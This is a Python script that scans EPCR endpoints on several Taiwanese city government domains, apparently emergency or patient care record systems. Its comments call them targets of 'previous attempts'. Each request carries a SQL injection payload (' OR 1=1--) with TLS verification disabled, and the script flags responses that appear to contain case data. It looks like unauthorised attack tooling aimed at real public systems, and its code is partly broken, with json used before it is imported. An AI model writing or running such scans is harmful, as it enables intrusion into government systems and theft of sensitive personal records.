#!/usr/bin/env python3
"""
Search for EPCR-like systems across Taiwan cities
"""

import requests
import re

# EPCR system patterns
epcr_endpoints = [
    # New Taipei City (original target)
    'https://epcr.tpf.gov.tw:4001/events',
    'https://epcr.tpf.gov.tw:4001/',
    'https://epcr.tpf.gov.tw/',
    
    # Other cities - try different naming patterns
    'https://epcr.khc.gov.tw:4001/events',
    'https://epcr.khc.gov.tw/',
    'https://epcr.ty.gov.tw:4001/events',
    'https://epcr.ty.gov.tw/',
    
    # Kaohsiung
    'https://epcr.khh.gov.tw:4001/events',
    'https://epcr.khh.gov.tw/',
    
    # Taipei City
    'https://epcr.tpe.gov.tw:4001/events',
    'https://epcr.tpe.gov.tw/',
    
    # Tainan
    'https://epcr.tn.gov.tw:4001/events',
    'https://epcr.tn.gov.tw/',
    
    # Taichung
    'https://epcr.taichung.gov.tw:4001/events',
    'https://epcr.taichung.gov.tw/',
]

sess = requests.Session()
sess.verify = False
sess.trust_env = False

print("=== Searching for EPCR systems ===")

for url in epcr_endpoints:
    try:
        # Add a test parameter for SQL injection (similar to previous attempts)
        test_url = f"{url}?CaseID=' OR 1=1--&limit=1"
        
        r = sess.get(test_url, timeout=15)
        print(f"\n✓ {url}")
        print(f"  Status: {r.status_code}")
        print(f"  Content-Type: {r.headers.get('content-type', 'unknown')}")
        
        if 'content-type' in r.headers.get('content-type', '').lower():
            try:
                data = r.json()
                print(f"  JSON Response: {json.dumps(data, indent=2)[:500]}")
            except:
                if len(r.text) > 0:
                    print(f"  Content: {r.text[:200]}")
                    
            # Check for case data
            if 'CaseID' in r.text or 'caseId' in r.text or 'case' in r.text.lower():
                print(f"  [!] Potential case data found")
                
    except Exception as e:
        print(f"✗ {url}: {str(e)[:60]}")

import json